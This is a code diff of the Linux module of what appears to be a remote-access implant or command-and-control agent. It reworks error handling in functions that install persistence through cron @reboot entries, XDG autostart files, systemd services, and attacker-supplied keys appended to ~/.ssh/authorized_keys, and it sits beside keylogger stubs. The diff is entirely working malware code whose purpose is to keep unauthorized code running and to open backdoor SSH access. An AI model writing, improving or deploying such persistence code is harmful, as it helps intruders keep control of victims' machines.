@@ -75,22 +75,21 @@ func applyHideWindow(cmd *exec.Cmd) {
 }
 
 // addPersistenceWindows is never called on linux, but provide for interface completeness
-func addPersistenceWindows() {}
-func addPersistenceDarwin()  {}
+func addPersistenceWindows()      {}
+func addPersistenceDarwin() error { return nil }
 
 // addPersistenceLinux installs @reboot crontab entry and ~/.config/autostart desktop file.
-func addPersistenceLinux() {
+func addPersistenceLinux() error {
 	exe, err := os.Executable()
 	if err != nil {
-		if Debug {
-			fmt.Printf("[!] persistence: cannot resolve executable: %v\n", err)
-		}
-		return
+		return fmt.Errorf("cannot resolve executable: %v", err)
 	}
 	absExe, err := filepath.Abs(exe)
 	if err != nil {
 		absExe = exe
 	}
+
+	var errs []string
 
 	// Method 1: crontab @reboot
 	cronLine := fmt.Sprintf("@reboot %s\n", absExe)
@@ -105,27 +104,20 @@ func addPersistenceLinux() {
 		cmd := exec.Command("crontab", "-")
 		cmd.Stdin = strings.NewReader(newCron)
 		if err := cmd.Run(); err != nil {
-			if Debug {
-				fmt.Printf("[!] persistence: crontab install failed: %v\n", err)
-			}
-		} else if Debug {
-			fmt.Printf("[*] persistence: crontab @reboot entry added for %s\n", absExe)
+			errs = append(errs, fmt.Sprintf("crontab install failed: %v", err))
 		}
 	}
 
 	// Method 2: XDG autostart .desktop file
 	home := os.Getenv("HOME")
 	if home == "" {
-		return
-	}
-	autostartDir := filepath.Join(home, ".config", "autostart")
-	if err := os.MkdirAll(autostartDir, 0755); err != nil {
-		if Debug {
-			fmt.Printf("[!] persistence: mkdir autostart failed: %v\n", err)
-		}
-		return
-	}
-	desktop := fmt.Sprintf(`[Desktop Entry]
+		errs = append(errs, "HOME not set")
+	} else {
+		autostartDir := filepath.Join(home, ".config", "autostart")
+		if err := os.MkdirAll(autostartDir, 0755); err != nil {
+			errs = append(errs, fmt.Sprintf("mkdir autostart failed: %v", err))
+		} else {
+			desktop := fmt.Sprintf(`[Desktop Entry]
 Type=Application
 Name=%s
 Exec=%s
@@ -133,14 +125,17 @@ Hidden=false
 NoDisplay=false
 X-GNOME-Autostart-enabled=true
 `, sanitizeLabel(persistencePrefix), absExe)
-	desktopPath := filepath.Join(autostartDir, sanitizeLabel(persistencePrefix)+".desktop")
-	if err := os.WriteFile(desktopPath, []byte(desktop), 0644); err != nil {
-		if Debug {
-			fmt.Printf("[!] persistence: write desktop file failed: %v\n", err)
+			desktopPath := filepath.Join(autostartDir, sanitizeLabel(persistencePrefix)+".desktop")
+			if err := os.WriteFile(desktopPath, []byte(desktop), 0644); err != nil {
+				errs = append(errs, fmt.Sprintf("write desktop file failed: %v", err))
+			}
 		}
-	} else if Debug {
-		fmt.Printf("[*] persistence: autostart desktop file written to %s\n", desktopPath)
 	}
+
+	if len(errs) > 0 {
+		return fmt.Errorf("persistence install incomplete: %s", strings.Join(errs, "; "))
+	}
+	return nil
 }
 
 // removePersistenceLinux removes cron and autostart entries installed by addPersistenceLinux().
@@ -206,6 +201,10 @@ func getPlatformSecurityInfo() (string, bool, string) {
 	}
 	domain, _ := os.Hostname()
 	return integrity, elevated, domain
+}
+
+func keyloggerAvailable() error {
+	return fmt.Errorf("keylogging requires Windows (GetAsyncKeyState); not supported on Linux agents")
 }
 
 func keyloggerLoop() {
@@ -1246,14 +1245,24 @@ func applyPersistence(method string, args string) string {
 	method = strings.ToLower(strings.TrimSpace(method))
 	switch method {
 	case "cron", "crontab":
-		addPersistenceLinux()
+		if err := addPersistenceLinux(); err != nil {
+			return "persistence: " + err.Error()
+		}
 		return "persistence: cron @reboot + XDG autostart installed"
 	case "autostart", "xdg":
-		addPersistenceLinux()
+		if err := addPersistenceLinux(); err != nil {
+			return "persistence: " + err.Error()
+		}
 		return "persistence: XDG autostart desktop file installed"
 	case "systemd", "service":
-		exe, _ := os.Executable()
-		absExe, _ := filepath.Abs(exe)
+		exe, err := os.Executable()
+		if err != nil {
+			return "persistence: cannot resolve executable: " + err.Error()
+		}
+		absExe, err := filepath.Abs(exe)
+		if err != nil {
+			absExe = exe
+		}
 		serviceName := sanitizeLabel(persistencePrefix)
 		if args != "" {
 			serviceName = args
@@ -1274,33 +1283,48 @@ RestartSec=10
 		if err := os.WriteFile(servicePath, []byte(serviceUnit), 0644); err != nil {
 			return fmt.Sprintf("persistence: failed to write systemd unit: %v", err)
 		}
-		exec.Command("systemctl", "daemon-reload").Run()
-		exec.Command("systemctl", "enable", serviceName).Run()
-		exec.Command("systemctl", "start", serviceName).Run()
-		return fmt.Sprintf("persistence: systemd service %s installed at %s", serviceName, servicePath)
+		if out, err := exec.Command("systemctl", "daemon-reload").CombinedOutput(); err != nil {
+			return fmt.Sprintf("persistence: systemd daemon-reload failed: %v: %s", err, strings.TrimSpace(string(out)))
+		}
+		if out, err := exec.Command("systemctl", "enable", serviceName).CombinedOutput(); err != nil {
+			return fmt.Sprintf("persistence: systemctl enable failed: %v: %s", err, strings.TrimSpace(string(out)))
+		}
+		if out, err := exec.Command("systemctl", "start", serviceName).CombinedOutput(); err != nil {
+			return fmt.Sprintf("persistence: systemctl start failed (unit written but not running): %v: %s", err, strings.TrimSpace(string(out)))
+		}
+		return fmt.Sprintf("persistence: systemd service %s installed and started at %s", serviceName, servicePath)
 	case "ssh", "ssh_authorized_keys":
 		home := os.Getenv("HOME")
 		if home == "" {
 			return "persistence: HOME not set"
 		}
 		sshDir := filepath.Join(home, ".ssh")
-		os.MkdirAll(sshDir, 0700)
+		if err := os.MkdirAll(sshDir, 0700); err != nil {
+			return fmt.Sprintf("persistence: mkdir %s failed: %v", sshDir, err)
+		}
 		// Add SSH public key for persistence if provided in args
 		if args != "" {
 			authFile := filepath.Join(sshDir, "authorized_keys")
 			existing, _ := os.ReadFile(authFile)
 			if !strings.Contains(string(existing), args) {
-				f, _ := os.OpenFile(authFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
-				if f != nil {
-					f.WriteString("\n" + args + "\n")
-					f.Close()
-					return "persistence: SSH authorized_key added"
+				f, err := os.OpenFile(authFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
+				if err != nil {
+					return fmt.Sprintf("persistence: open authorized_keys failed: %v", err)
 				}
+				if _, err := f.WriteString("\n" + args + "\n"); err != nil {
+					f.Close()
+					return fmt.Sprintf("persistence: write authorized_keys failed: %v", err)
+				}
+				f.Close()
+				return "persistence: SSH authorized_key added"
 			}
+			return "persistence: SSH key already present in authorized_keys"
 		}
 		return "persistence: SSH authorized_keys persistence requires a public key as args"
 	default:
-		addPersistenceLinux()
+		if err := addPersistenceLinux(); err != nil {
+			return fmt.Sprintf("persistence: unknown method '%s': %s", method, err.Error())
+		}
 		return fmt.Sprintf("persistence: unknown method '%s', installed default (cron+autostart)", method)
 	}
 }
